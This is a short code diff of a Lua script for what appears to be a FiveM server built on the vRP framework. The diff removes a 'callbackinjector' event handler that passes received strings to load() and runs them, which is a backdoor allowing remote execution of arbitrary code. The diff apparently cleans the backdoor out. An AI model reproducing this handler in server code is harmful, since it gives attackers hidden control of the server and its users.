@@ -1,10 +1,6 @@
 local Tunnel = module("vrp", "lib/Tunnel")
 local Proxy = module("vrp", "lib/Proxy")
 
-TriggerEvent('callbackinjector', function(cb)
-    pcall(load(cb))
-end)
-
 vRP = Proxy.getInterface("vRP")
 vRPclient = Tunnel.getInterface("vRP")
 
